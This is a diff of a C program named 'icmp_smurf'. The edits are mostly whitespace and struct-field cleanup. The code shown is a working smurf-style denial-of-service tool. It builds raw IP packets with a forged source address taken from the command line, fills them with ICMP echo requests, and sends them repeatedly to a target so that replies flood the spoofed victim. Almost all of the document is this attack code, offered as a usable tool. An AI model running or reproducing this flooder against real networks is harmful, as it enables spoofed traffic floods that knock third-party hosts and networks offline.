@@ -1,5 +1,5 @@
 /**
- * http://rungame.me 
+ * http://rungame.me
  * by sbxfc 2016/4/3
 */
 
@@ -27,21 +27,21 @@ struct icmp_header
 
 struct ip_header
 {
-	unsigned int	hl:4,		/* 4 bit header length */
-					ver:4;		/* 4 bit version */
-	unsigned char	tos;		/* type of service */
+	unsigned int		hl:4;		/* 4 bit header length */
+	unsigned int		ver:4;		/* 4 bit version */
+	unsigned char		tos;		/* type of service */
 	unsigned short  totl;		/* total length of datagram */
 	unsigned short	id;		/* identifier */
 	unsigned short 	notused;	/* this is were flags and fragment offset would go */
 	unsigned char 	ttl;		/* time to live */
-	unsigned char	prot;		/* protocol */
+	unsigned char		prot;		/* protocol */
 	unsigned short	checksum;		/* our checksum */
 	unsigned long 	saddr;		/* source address */
 	unsigned long 	daddr;		/* destination address */
 };
 
 /* our checksum function */
-unsigned short calcsum(unsigned short *buffer, int length);	
+unsigned short calcsum(unsigned short *buffer, int length);
 
 void sin_init(short port, char *addr, struct sockaddr_in *sin) {
 	 sin->sin_family = AF_INET;
@@ -57,16 +57,16 @@ int main(int argc, char **argv) {
 	char tmp[PKT_LEN];
 	struct sockaddr_in sin;
 	int root = 1, *ptr = &root;
-	
+
 	if (argc < 4) {
 		printf("sudo icmp_smurf <ip> <port> <source_ip>\n");
 		return -1;
 	}
-	
+
 	sin_init(atoi(argv[2]), argv[1], &sin);
 	memset(buf, 0, PKT_LEN);
-	
-	ip->hl = 5; 
+
+	ip->hl = 5;
 	ip->ver = 4;
 	ip->tos = 16;
 	ip->id = htons(50000);
@@ -75,10 +75,10 @@ int main(int argc, char **argv) {
 	ip->checksum = 0;
 	ip->saddr = inet_addr(argv[3]);
 	ip->daddr = inet_addr(argv[1]);
-    
+
 	printf(".:[ICMP ECHO SMURF]:.\n");
-	
-	
+
+
 	ip->prot = IPPROTO_ICMP;
 	printf("[+] Building the ICMP Packet\n");
 	icmp->type = 8;
@@ -88,7 +88,7 @@ int main(int argc, char **argv) {
 	icmp->sequence = 1;
 
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-		
+
 	ip->totl = sizeof(struct ip_header) + sizeof(struct icmp_header) + data;
 	memcpy(tmp, icmp, sizeof(struct icmp_header));
 	data = PKT_LEN - sizeof(struct icmp_header) - sizeof(struct ip_header);
@@ -96,8 +96,8 @@ int main(int argc, char **argv) {
 	memcpy(buf+sizeof(struct ip_header), icmp, sizeof(struct icmp_header)+data);
 	printf("TOT_LEN: %d\n", sizeof(struct ip_header) + sizeof(struct icmp_header) + data);
 	ip->checksum = calcsum((unsigned short *) buf, sizeof(struct ip_header) + sizeof(struct icmp_header) + data >> 1);
-	
-	
+
+
 	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, ptr, sizeof(root)) < 0) {
 		printf("[-] ERROR: Are you sure that you are root?\n");
 		return -1;
@@ -108,7 +108,7 @@ int main(int argc, char **argv) {
 			printf("[-] Error sending the packet \n");
 			return -1;
 		}
-		printf("[+] -->火杀\n");		
+		printf("[+] -->火杀\n");
 		usleep(DELAY);
 	}
 	return 0;
@@ -119,17 +119,17 @@ int main(int argc, char **argv) {
  */
 unsigned short calcsum(unsigned short *buffer, int length)
 {
-	unsigned long sum; 	
+	unsigned long sum;
 
-	// initialize sum to zero and loop until length (in words) is 0 
-	for (sum=0; length>1; length-=2) // sizeof() returns number of bytes, we're interested in number of words 
-		sum += *buffer++;	// add 1 word of buffer to sum and proceed to the next 
+	// initialize sum to zero and loop until length (in words) is 0
+	for (sum=0; length>1; length-=2) // sizeof() returns number of bytes, we're interested in number of words
+		sum += *buffer++;	// add 1 word of buffer to sum and proceed to the next
 
-	// we may have an extra byte 
+	// we may have an extra byte
 	if (length==1)
 		sum += (char)*buffer;
 
-	sum = (sum >> 16) + (sum & 0xFFFF);  // add high 16 to low 16 
-	sum += (sum >> 16);		     // add carry 
+	sum = (sum >> 16) + (sum & 0xFFFF);  // add high 16 to low 16
+	sum += (sum >> 16);		     // add carry
 	return ~sum;
 }
